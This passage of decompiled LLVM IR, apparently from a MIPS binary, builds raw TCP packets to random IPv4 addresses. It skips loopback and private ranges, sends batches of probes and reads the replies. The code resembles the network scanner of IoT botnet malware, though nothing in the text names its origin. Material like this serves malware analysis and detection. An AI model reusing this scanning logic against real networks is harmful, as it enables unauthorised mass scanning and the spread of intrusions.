  %v1_403268 = load i32, i32* @t9, align 4
  %v2_403268 = add i32 %v1_403268, 319344
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403270 = load i32, i32* @ra, align 4
  %v0_403274 = load i32, i32* @fp, align 4
  %v0_403278 = load i32, i32* @s7, align 4
  %v0_40327c = load i32, i32* @s6, align 4
  %v0_403284 = load i32, i32* @s4, align 4
  %v0_403294 = load i32, i32* @s0, align 4
  %v3_40329c = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_40329c, i32* @t9, align 4
  %v2_4032a4 = urem i32 %arg1, 256
  store i32 %v2_4032a4, i32* @s7, align 4
  %v3_4032a4 = call i32 @function_404b70()
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v3_4032a4, i32* %v1.global-to-local, align 4
  %v3_4032b4 = load i32, i32* bitcast (i32** @global_var_44935c.234 to i32*), align 4
  store i32 %v3_4032b4, i32* %v0.global-to-local, align 4
  %v1_4032b8 = icmp sgt i32 %v3_4032a4, 0
  %v4_4032b8 = inttoptr i32 %v3_4032b4 to i32*
  store i32 %v3_4032a4, i32* %v4_4032b8, align 4
  br i1 %v1_4032b8, label %dec_label_pc_4040e4, label %dec_label_pc_4032bc

dec_label_pc_4032bc:                              ; preds = %dec_label_pc_403260
  store i32 -1, i32* @s0, align 4
  %v0_4032c4 = load i32, i32* %v1.global-to-local, align 4
  %v2_4032c4 = icmp eq i32 %v0_4032c4, -1
  br i1 %v2_4032c4, label %dec_label_pc_4040e4, label %dec_label_pc_4032c8

dec_label_pc_4032c8:                              ; preds = %dec_label_pc_4032bc
  %v3_4032cc = load i32, i32* @global_var_4493a8.171, align 4
  store i32 %v3_4032cc, i32* @t9, align 4
  %v1_4032d4 = call i32 @function_402a88()
  store i32 %v1_4032d4, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_4032e4 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_4032e4, i32* @t9, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  %v4_4032ec = call i32 @function_402978()
  store i32 %v4_4032ec, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 40, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v3_403304 = ptrtoint i32* %stack_var_-2892 to i32
  store i32 %v3_403304, i32* %a0.global-to-local, align 4
  %v8_403304 = call i32 @function_405660(i32* nonnull %stack_var_-2892, i32 0, i32 40)
  store i32 %v8_403304, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403314 = load i32, i32* @global_var_449340.224, align 4
  store i32 %v3_403314, i32* @t9, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v3_40331c = call i32 @function_4050e0(i32* null)
  store i32 %v3_40331c, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 160, i32* %a0.global-to-local, align 4
  %v3_40332c = load i32, i32* bitcast (i32** @global_var_4494bc.253 to i32*), align 4
  store i32 %v3_40332c, i32* %v1.global-to-local, align 4
  %v3_403330 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_403330, i32* @t9, align 4
  %v2_403334 = inttoptr i32 %v3_40332c to i32*
  store i32 %v3_40331c, i32* %v2_403334, align 4
  store i32 536, i32* %a1.global-to-local, align 4
  %v4_403338 = call i32 @function_405fc0(i64 160, i32 536)
  store i32 %v4_403338, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v3_403348 = load i32, i32* @global_var_449444.206, align 4
  store i32 %v3_403348, i32* @t9, align 4
  store i32 3, i32* %a1.global-to-local, align 4
  store i32 6, i32* @a2, align 4
  store i32 %v4_403338, i32* @s6, align 4
  %v5_403354 = call i32 @function_405be0(i32 2, i32 3)
  store i32 %v5_403354, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_403360 = load i32, i32* @s0, align 4
  %v2_403360 = icmp eq i32 %v5_403354, %v1_403360
  store i32 %v5_403354, i32* @s4, align 4
  br i1 %v2_403360, label %dec_label_pc_4033e4, label %dec_label_pc_403364

dec_label_pc_403364:                              ; preds = %dec_label_pc_4032c8
  %v3_403368 = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_403368, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v5_403354, i32* @a0, align 4
  %v2_403374 = call i32 @function_4049b0()
  store i32 %v2_403374, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403380 = load i32, i32* @s4, align 4
  store i32 %v0_403380, i32* @a0, align 4
  %v3_403384 = load i32, i32* @global_var_449294.208, align 4
  store i32 %v3_403384, i32* @t9, align 4
  %v1_403388 = or i32 %v2_403374, 128
  store i32 %v1_403388, i32* %a2.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v1_40338c = call i32 @function_4049b0()
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_40339c = load i32, i32* @global_var_4493bc.254, align 4
  store i32 %v3_40339c, i32* @t9, align 4
  store i32 1, i32* %stack_var_-2928, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v0_4033ac = load i32, i32* @s4, align 4
  store i32 %v0_4033ac, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a2.global-to-local, align 4
  %v3_4033b8 = ptrtoint i32* %stack_var_-2928 to i32
  store i32 %v3_4033b8, i32* %a3.global-to-local, align 4
  %v10_4033b8 = call i32 @function_405b60(i32 %v0_4033ac, i32 0, i32 3, i32* nonnull %stack_var_-2928, i32 4)
  store i32 %v10_4033b8, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_4033c4 = icmp eq i32 %v10_4033b8, 0
  br i1 %v1_4033c4, label %dec_label_pc_4033f4, label %dec_label_pc_4033c8

dec_label_pc_4033c8:                              ; preds = %dec_label_pc_403364
  %v3_4033cc = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_4033cc, i32* @t9, align 4
  %v1_4033d4 = load i32, i32* @s4, align 4
  store i32 %v1_4033d4, i32* %a0.global-to-local, align 4
  %v3_4033d4 = call i32 @function_404b10(i32 %v1_4033d4)
  store i32 %v3_4033d4, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4033e4

dec_label_pc_4033e4:                              ; preds = %dec_label_pc_4034c4, %dec_label_pc_4032c8, %dec_label_pc_4033c8
  %v1_4033e4 = add i32 %v1_403268, 286844
  %v2_4033e4 = inttoptr i32 %v1_4033e4 to i32*
  %v3_4033e4 = load i32, i32* %v2_4033e4, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4033e4)
  %v0_4033f4.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4033f4

dec_label_pc_4033f4:                              ; preds = %dec_label_pc_403364, %dec_label_pc_4033e4
  %v0_4033f4 = phi i32 [ %v2_403268, %dec_label_pc_403364 ], [ %v0_4033f4.pre, %dec_label_pc_4033e4 ]
  %v1_4033f4 = add i32 %v0_4033f4, -32420
  %v2_4033f4 = inttoptr i32 %v1_4033f4 to i32*
  %v3_4033f4 = load i32, i32* %v2_4033f4, align 4
  store i32 ptrtoint (i32* @global_var_403404.256 to i32), i32* @ra, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4033f4)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_40340c = load i32, i32* @global_var_449480.179, align 4
  store i32 %v3_40340c, i32* @t9, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v2_403414 = call i32 @function_400f98(i32 27)
  store i32 %v2_403414, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403414, i32* %a0.global-to-local, align 4
  %v3_403424 = load i32, i32* @global_var_4493d4.204, align 4
  store i32 %v3_403424, i32* @t9, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  %v3_40342c = call i32 @function_402b38(i32 %v2_403414, i32 16)
  store i32 %v3_40342c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_40343c = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_40343c, i32* @t9, align 4
  %v1_403440 = icmp eq i32 %v3_40342c, 0
  store i32 %v3_40342c, i32* @fp, align 4
  br i1 %v1_403440, label %dec_label_pc_403444, label %dec_label_pc_403464

dec_label_pc_403444:                              ; preds = %dec_label_pc_4033f4
  store i32 26, i32* %a0.global-to-local, align 4
  %v2_403448 = call i32 @function_400e4c(i32 26)
  store i32 %v2_403448, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403458 = load i32, i32* @global_var_449284.12, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403464

dec_label_pc_403464:                              ; preds = %dec_label_pc_4033f4, %dec_label_pc_403444
  %v0_403464 = phi i32 [ %v3_40343c, %dec_label_pc_4033f4 ], [ %v3_403458, %dec_label_pc_403444 ]
  store i32 ptrtoint (i32* @global_var_40346c.257 to i32), i32* @ra, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_403464)
  %v0_40346c = load i32, i32* @fp, align 4
  %v1_40346c = add i32 %v0_40346c, 261
  %v2_40346c = inttoptr i32 %v1_40346c to i8*
  %v3_40346c = load i8, i8* %v2_40346c, align 1
  %v4_40346c = zext i8 %v3_40346c to i32
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_403474 = add nuw nsw i32 %v4_40346c, 254
  %v1_403478 = and i32 %v1_403474, 254
  %v1_40347c = icmp ult i32 %v1_403478, 14
  %v2_40347c = zext i1 %v1_40347c to i32
  store i32 %v2_40347c, i32* %v0.global-to-local, align 4
  store i32 %v0_40346c, i32* %a0.global-to-local, align 4
  br i1 %v1_40347c, label %dec_label_pc_4034bc, label %dec_label_pc_403484

dec_label_pc_403484:                              ; preds = %dec_label_pc_403464
  %v3_403488 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_403488, i32* @t9, align 4
  %v2_403490 = call i32 @function_406080(i32 %v0_40346c)
  store i32 %v2_403490, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_4034a0 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_4034a0, i32* @t9, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v2_4034a8 = call i32 @function_406580(i32 10)
  store i32 %v2_4034a8, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4034bc

dec_label_pc_4034bc:                              ; preds = %dec_label_pc_403464, %dec_label_pc_403484
  %v0_4034c0 = load i32, i32* @s7, align 4
  %v2_4034c0 = icmp eq i32 %v0_4034c0, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_4034c0, label %dec_label_pc_4034d8, label %dec_label_pc_4034c4

dec_label_pc_4034c4:                              ; preds = %dec_label_pc_4034bc
  %v2_4034c8 = icmp eq i32 %v0_4034c0, 2
  store i32 20480, i32* %v0.global-to-local, align 4
  br i1 %v2_4034c8, label %dec_label_pc_4034d8, label %dec_label_pc_4033e4

dec_label_pc_4034d8:                              ; preds = %dec_label_pc_4034c4, %dec_label_pc_4034bc
  store i32 34254, i32* %v1.global-to-local, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v0_4034f0 = load i32, i32* @s6, align 4
  %v1_4034f0 = add i32 %v0_4034f0, 16
  store i32 %v1_4034f0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4034f4

dec_label_pc_4034f4:                              ; preds = %dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge, %dec_label_pc_4034d8
  %v0_403514 = phi i32 [ %v1_40351c, %dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge ], [ %v1_4034f0, %dec_label_pc_4034d8 ]
  %v1_40350c = phi i32 [ %v1_40350c.pre, %dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge ], [ %v0_4034f0, %dec_label_pc_4034d8 ]
  %v0_403504 = phi i32 [ %v2_403520, %dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge ], [ 0, %dec_label_pc_4034d8 ]
  %v1_403504 = add i32 %v0_403504, 1
  store i32 %v1_403504, i32* %a2.global-to-local, align 4
  %v1_403508 = mul i32 %v0_403504, 536
  %v2_40350c = add i32 %v1_403508, %v1_40350c
  store i32 %v2_40350c, i32* %v0.global-to-local, align 4
  %v1_403510 = icmp slt i32 %v1_403504, 160
  %v2_403510 = zext i1 %v1_403510 to i32
  store i32 %v2_403510, i32* %v1.global-to-local, align 4
  %v1_403514 = inttoptr i32 %v0_403514 to i8*
  store i8 0, i8* %v1_403514, align 1
  %v0_403518 = load i32, i32* %a3.global-to-local, align 4
  %v1_403518 = load i32, i32* %v0.global-to-local, align 4
  %v2_403518 = add i32 %v1_403518, 8
  %v3_403518 = inttoptr i32 %v2_403518 to i32*
  store i32 %v0_403518, i32* %v3_403518, align 4
  %v0_40351c = load i32, i32* %a0.global-to-local, align 4
  %v1_40351c = add i32 %v0_40351c, 536
  store i32 %v1_40351c, i32* %a0.global-to-local, align 4
  %v0_403520 = load i32, i32* %v1.global-to-local, align 4
  %v1_403520 = icmp eq i32 %v0_403520, 0
  %v2_403520 = load i32, i32* %a2.global-to-local, align 4
  store i32 %v2_403520, i32* %a1.global-to-local, align 4
  br i1 %v1_403520, label %dec_label_pc_403524, label %dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge

dec_label_pc_4034f4.dec_label_pc_4034f4_crit_edge: ; preds = %dec_label_pc_4034f4
  %v1_40350c.pre = load i32, i32* @s6, align 4
  br label %dec_label_pc_4034f4

dec_label_pc_403524:                              ; preds = %dec_label_pc_4034f4
  %v3_403528 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_403528, i32* @t9, align 4
  store i32 160, i32* %v0.global-to-local, align 4
  store i32 160, i32* %stack_var_-2928, align 4
  %v5_403530 = call i32 @function_402978()
  %v3_403538 = load i32, i32* %stack_var_-2892, align 4
  store i32 -16, i32* %a0.global-to-local, align 4
  store i32 -241, i32* %s0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_403548 = and i32 %v3_403538, -256
  %v1_403554 = or i32 %v1_403548, 69
  %v3_403558 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_403558, i32* @t9, align 4
  store i32 %v1_403554, i32* %stack_var_-2892, align 4
  %v1_403560 = urem i32 %v5_403530, 65536
  store i32 %v1_403560, i32* %v0.global-to-local, align 4
  store i32 10240, i32* %v1.global-to-local, align 4
  %v7_40356c = call i32 @function_402978()
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %sext13 = mul i32 %v5_403530, 65536
  %v4_403580 = sdiv i32 %sext13, 65536
  store i32 %v4_403580, i32* %a1.global-to-local, align 4
  store i32 -31282, i32* %a2.global-to-local, align 4
  %v1_40358c = load i32, i32* %s0.global-to-local, align 4
  %v2_40358c = and i32 %v1_40358c, %tmp73
  %v3_403590 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_403590, i32* @t9, align 4
  %v1_403594 = or i32 %v2_40358c, 80
  store i32 %v1_403594, i32* %v1.global-to-local, align 4
  store i32 6, i32* %v0.global-to-local, align 4
  %v6_4035a8 = trunc i32 %v4_403580 to i16
  store i16 %v6_4035a8, i16* %stack_var_-2872, align 2
  %v6_4035ac = call i32 @function_402978()
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v2_4035c8 = ptrtoint i16* %stack_var_-2872 to i32
  %v3_4035d4 = load i32, i32* bitcast (i32** @global_var_4494bc.253 to i32*), align 4
  store i32 %v3_4035d4, i32* %v0.global-to-local, align 4
  %v1_4035e4 = icmp eq i32 %v3_4035d4, 0
  br i1 %v1_4035e4, label %dec_label_pc_4037d8, label %dec_label_pc_4035e8

dec_label_pc_4035e8:                              ; preds = %dec_label_pc_403524
  store i32 0, i32* %stack_var_-2928, align 4
  %v2_403750 = add i32 %v2_4035c8, 4
  %v3_403750 = inttoptr i32 %v2_403750 to i32*
  %v4_40377c = add i32 %v2_4035c8, 16
  %v5_40377c = inttoptr i32 %v4_40377c to i16*
  %v2_403790 = ptrtoint i32* %stack_var_-2908 to i32
  br label %dec_label_pc_4035f0

dec_label_pc_4035f0:                              ; preds = %dec_label_pc_4036e8, %dec_label_pc_4035e8
  %v3_4035f0 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_4035f0, i32* @t9, align 4
  %v1_4035f8 = call i32 @function_402978()
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403608 = load i32, i32* @global_var_449490, align 4
  store i32 %v3_403608, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40361c

dec_label_pc_40361c:                              ; preds = %dec_label_pc_4036e4, %dec_label_pc_4036cc, %dec_label_pc_4036bc, %dec_label_pc_40361c, %dec_label_pc_4035f0
  %v3_40361c = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_40361c, i32* @t9, align 4
  store i32 -2139095040, i32* %s0.global-to-local, align 4
  %v1_403624 = call i32 @function_402978()
  %v2_403624 = sext i32 %v1_403624 to i64
  store i32 -2139062143, i32* %s0.global-to-local, align 4
  %v5_403630 = mul nuw nsw i64 %v2_403624, 2155905153
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_40363c = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_40363c, i32* @t9, align 4
  %v1_4036444 = udiv i64 %v5_403630, 549755813888
  %v1_403644 = trunc i64 %v1_4036444 to i32
  store i32 %v1_403644, i32* %v1.global-to-local, align 4
  %v3_403648 = add i32 %v1_403644, %v1_403624
  store i32 %v3_403648, i32* %v0.global-to-local, align 4
  %v2_40364c = urem i32 %v3_403648, 256
  store i32 %v2_40364c, i32* %s1.global-to-local, align 4
  %v3_40364c = call i32 @function_402978()
  %v4_40364c = sext i32 %v3_40364c to i64
  %v2_403654 = load i32, i32* %s0.global-to-local, align 4
  %v4_403654 = zext i32 %v2_403654 to i64
  %v5_403654 = mul nuw nsw i64 %v4_403654, %v4_40364c
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403660 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_403660, i32* @t9, align 4
  %v1_4036686 = udiv i64 %v5_403654, 549755813888
  %v1_403668 = trunc i64 %v1_4036686 to i32
  store i32 %v1_403668, i32* %v1.global-to-local, align 4
  %v3_40366c = add i32 %v1_403668, %v3_40364c
  store i32 %v3_40366c, i32* %v0.global-to-local, align 4
  %v2_403670 = urem i32 %v3_40366c, 256
  store i32 %v2_403670, i32* %s2.global-to-local, align 4
  %v3_403670 = call i32 @function_402978()
  %v4_403670 = sext i32 %v3_403670 to i64
  %v2_403678 = load i32, i32* %s0.global-to-local, align 4
  %v4_403678 = zext i32 %v2_403678 to i64
  %v5_403678 = mul nuw nsw i64 %v4_403678, %v4_403670
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403684 = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_403684, i32* @t9, align 4
  %v1_40368c8 = udiv i64 %v5_403678, 549755813888
  %v1_40368c = trunc i64 %v1_40368c8 to i32
  store i32 %v1_40368c, i32* %v1.global-to-local, align 4
  %v3_403690 = add i32 %v1_40368c, %v3_403670
  store i32 %v3_403690, i32* %v0.global-to-local, align 4
  %v2_403694 = urem i32 %v3_403690, 256
  store i32 %v2_403694, i32* %s3.global-to-local, align 4
  %v3_403694 = call i32 @function_402978()
  %v4_403694 = sext i32 %v3_403694 to i64
  %v2_40369c = load i32, i32* %s0.global-to-local, align 4
  %v4_40369c = zext i32 %v2_40369c to i64
  %v5_40369c = mul nuw nsw i64 %v4_40369c, %v4_403694
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_4036a810 = udiv i64 %v5_40369c, 549755813888
  %v1_4036a8 = trunc i64 %v1_4036a810 to i32
  %v3_4036ac = add i32 %v1_4036a8, %v3_403694
  %v1_4036b0 = urem i32 %v3_4036ac, 256
  store i32 %v1_4036b0, i32* %a0.global-to-local, align 4
  store i32 127, i32* %v0.global-to-local, align 4
  %v0_4036b8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4036b8 = icmp eq i32 %v0_4036b8, 127
  br i1 %v2_4036b8, label %dec_label_pc_40361c, label %dec_label_pc_4036bc

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_40361c
  %v1_4036c0 = icmp eq i32 %v0_4036b8, 0
  store i32 192, i32* %v0.global-to-local, align 4
  br i1 %v1_4036c0, label %dec_label_pc_40361c, label %dec_label_pc_4036c4

dec_label_pc_4036c4:                              ; preds = %dec_label_pc_4036bc
  %v2_4036c8 = icmp eq i32 %v0_4036b8, 192
  store i32 55, i32* %v0.global-to-local, align 4
  %v0_4036d4 = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_4036c8, label %dec_label_pc_4036cc, label %dec_label_pc_4036c4.dec_label_pc_4036e4_crit_edge

dec_label_pc_4036c4.dec_label_pc_4036e4_crit_edge: ; preds = %dec_label_pc_4036c4
  %.pre = mul i32 %v0_4036d4, 65536
  br label %dec_label_pc_4036e4

dec_label_pc_4036cc:                              ; preds = %dec_label_pc_4036c4
  %v2_4036d4 = icmp eq i32 %v0_4036d4, 168
  %v4_4036d4 = mul i32 %v0_4036d4, 65536
  store i32 %v4_4036d4, i32* %v0.global-to-local, align 4
  br i1 %v2_4036d4, label %dec_label_pc_40361c, label %dec_label_pc_4036d8

dec_label_pc_4036d8:                              ; preds = %dec_label_pc_4036cc
  store i32 -1073741824, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4036e4

dec_label_pc_4036e4:                              ; preds = %dec_label_pc_4036c4.dec_label_pc_4036e4_crit_edge, %dec_label_pc_4036d8
  %v4_4036e4.pre-phi = phi i32 [ %.pre, %dec_label_pc_4036c4.dec_label_pc_4036e4_crit_edge ], [ %v4_4036d4, %dec_label_pc_4036d8 ]
  %v1_4036e4 = phi i32 [ 55, %dec_label_pc_4036c4.dec_label_pc_4036e4_crit_edge ], [ %v4_4036d4, %dec_label_pc_4036d8 ]
  %v2_4036e4 = icmp eq i32 %v0_4036b8, %v1_4036e4
  store i32 %v4_4036e4.pre-phi, i32* %v0.global-to-local, align 4
  br i1 %v2_4036e4, label %dec_label_pc_40361c, label %dec_label_pc_4036e8

dec_label_pc_4036e8:                              ; preds = %dec_label_pc_4036e4
  %v1_4036ec = mul i32 %v0_4036b8, 16777216
  %v0_4036f8 = load i32, i32* %s3.global-to-local, align 4
  %v1_4036f8 = mul i32 %v0_4036f8, 256
  %v2_4036f0 = or i32 %v1_4036ec, %v1_4036b0
  %v2_4036f4 = or i32 %v2_4036f0, %v4_4036e4.pre-phi
  %v2_4036fc = or i32 %v2_4036f4, %v1_4036f8
  %v1_403704 = udiv i32 %v2_4036fc, 256
  %v1_403708 = and i32 %v1_403704, 65280
  %v1_403700 = mul i32 %v0_4036f8, 65536
  %v1_40370c = and i32 %v1_403700, 16711680
  %v1_403710 = udiv i32 %v2_4036fc, 16777216
  %v1_403714 = mul i32 %v3_4036ac, 16777216
  %v2_403718 = or i32 %v1_40370c, %v1_403714
  store i32 %v2_403718, i32* %v0.global-to-local, align 4
  %v2_40371c = or i32 %v2_403718, %v1_403710
  %v2_403724 = or i32 %v2_40371c, %v1_403708
  store i32 %v2_403724, i32* %v1.global-to-local, align 4
  store i32 %v3_403304, i32* @a0, align 4
  store i32 20, i32* @a1, align 4
  %v6_403734 = call i32 @function_4002d0(i32 %v3_403304, i32 20)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_4035c8, i32* %v0.global-to-local, align 4
  store i32 %v2_403724, i32* %v3_403750, align 4
  store i32 -31282, i32* %v1.global-to-local, align 4
  store i32 %v3_403304, i32* %a0.global-to-local, align 4
  %v2_40375c = load i32, i32* %v0.global-to-local, align 4
  %v3_40375c = add i32 %v2_40375c, 2
  %v4_40375c = inttoptr i32 %v3_40375c to i16*
  store i16 -31282, i16* %v4_40375c, align 2
  %v0_403760 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_403760, i32* @a1, align 4
  store i32 5120, i32* %a2.global-to-local, align 4
  store i32 20, i32* @a3, align 4
  %v2_40376c = add i32 %v0_403760, 16
  %v3_40376c = inttoptr i32 %v2_40376c to i16*
  store i16 0, i16* %v3_40376c, align 2
  %sext = mul i32 %v6_403734, 65536
  %v9_40376c = sdiv i32 %sext, 65536
  %v10_40376c = call i32 @function_400328(i32 %v3_403304, i32 %v0_403760, i32 5120, i32 20, i32 %v9_40376c)
  %v11_40376c = trunc i32 %v10_40376c to i16
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i16 %v11_40376c, i16* %v5_40377c, align 2
  store i32 %v2_403724, i32* %v1.global-to-local, align 4
  store i32 2, i32* %stack_var_-2908, align 4
  %v3_403794 = load i32, i32* @global_var_44938c.261, align 4
  store i32 %v3_403794, i32* @t9, align 4
  store i32 16, i32* %v0.global-to-local, align 4
  %v0_4037ac = load i32, i32* @s4, align 4
  store i32 %v0_4037ac, i32* %a0.global-to-local, align 4
  store i32 %v3_403304, i32* %a1.global-to-local, align 4
  store i32 40, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v8_4037b8 = call i32 @function_405ae0(i32 %v0_4037ac, i32* nonnull %stack_var_-2892, i32 40, i32 16384, i32 %v2_403790, i32 16)
  %v3_4037c0 = load i32, i32* %stack_var_-2928, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_4037c8 = add i32 %v3_4037c0, 1
  store i32 %v1_4037c8, i32* %v0.global-to-local, align 4
  %v1_4037cc = icmp slt i32 %v1_4037c8, 128
  %v2_4037cc = zext i1 %v1_4037cc to i32
  store i32 %v2_4037cc, i32* %v1.global-to-local, align 4
  store i32 %v1_4037c8, i32* %stack_var_-2928, align 4
  br i1 %v1_4037cc, label %dec_label_pc_4035f0, label %dec_label_pc_4037d8

dec_label_pc_4037d8:                              ; preds = %dec_label_pc_4036e8, %dec_label_pc_403524
  %v3_4037d8 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4037d8, i32* @t9, align 4
  %v1_4037e0 = call i32 @function_4055d0()
  store i32 %v1_4037e0, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v1_4037e0, i32* %s3.global-to-local, align 4
  %v2_403804 = ptrtoint i32* %stack_var_-1572 to i32
  %v4_403854 = zext i8 %tmp59 to i32
  %v4_403864 = zext i16 %tmp58 to i32
  %v2_40385c = icmp eq i8 %tmp59, 6
  br label %dec_label_pc_4037f0

dec_label_pc_4037f0:                              ; preds = %dec_label_pc_403860, %dec_label_pc_403850, %dec_label_pc_403834, %dec_label_pc_40382c, %dec_label_pc_4037d8
  %v0_4037f4 = phi i32 [ %v1_4037e0, %dec_label_pc_4037d8 ], [ %v0_403820, %dec_label_pc_40382c ], [ %v0_403820, %dec_label_pc_403834 ], [ %v0_403820, %dec_label_pc_403850 ], [ %v0_403820, %dec_label_pc_403860 ]
  %v3_4037f0 = load i32, i32* @global_var_44944c.230, align 4
  store i32 %v3_4037f0, i32* @t9, align 4
  %v1_4037f4 = inttoptr i32 %v0_4037f4 to i32*
  store i32 0, i32* %v1_4037f4, align 4
  %v0_4037f8 = load i32, i32* @s4, align 4
  store i32 %v0_4037f8, i32* %a0.global-to-local, align 4
  store i32 %v2_403804, i32* %a1.global-to-local, align 4
  store i32 1514, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v8_40380c = call i32 @function_405a00(i32 %v0_4037f8, i32* nonnull %stack_var_-1572, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v8_40380c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v1_403818 = icmp slt i32 %v8_40380c, 1
  store i32 %v8_40380c, i32* %a0.global-to-local, align 4
  br i1 %v1_403818, label %dec_label_pc_403980, label %dec_label_pc_40381c

dec_label_pc_40381c:                              ; preds = %dec_label_pc_4037f0
  %v0_403820 = load i32, i32* %s3.global-to-local, align 4
  %v1_403820 = inttoptr i32 %v0_403820 to i32*
  %v2_403820 = load i32, i32* %v1_403820, align 4
  store i32 %v2_403820, i32* %v1.global-to-local, align 4
  %v2_403828 = icmp eq i32 %v2_403820, 11
  %v4_403828 = icmp ult i32 %v8_40380c, 40
  %v5_403828 = zext i1 %v4_403828 to i32
  store i32 %v5_403828, i32* %v0.global-to-local, align 4
  br i1 %v2_403828, label %dec_label_pc_403980, label %dec_label_pc_40382c

dec_label_pc_40382c:                              ; preds = %dec_label_pc_40381c
  %v1_403830 = icmp eq i1 %v4_403828, false
  br i1 %v1_403830, label %dec_label_pc_403834, label %dec_label_pc_4037f0

dec_label_pc_403834:                              ; preds = %dec_label_pc_40382c
  %v3_403838 = load i32, i32* @global_var_449490, align 4
  store i32 %v3_403838, i32* %v1.global-to-local, align 4
  %v2_40384c = icmp eq i32 %tmp60, %v3_403838
  store i32 6, i32* %v0.global-to-local, align 4
